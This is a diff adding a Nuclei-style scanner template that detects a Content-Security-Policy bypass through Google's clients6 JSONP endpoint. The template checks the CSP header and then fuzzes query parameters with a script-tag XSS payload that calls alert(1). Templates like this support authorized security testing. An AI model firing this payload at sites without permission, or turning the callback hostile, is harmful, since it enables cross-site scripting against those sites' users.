@@ -1,0 +1,55 @@
+id: clients6-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - clients6
+  author: Jaenact
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,clients6,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "clients6.google.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: clients6_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "clients6_csp_xss == true"
+# digest: 4a0a00473045022100f6dfc0966f7a1a2f18527bfb658d63dbcae39d9d5302388f260c96da0619811002203b19387cc04f47187b8dc147f00c81d4ad795eacf596031ab8f1367d3107751f:922c64590222798bb761d5b6d8e72950
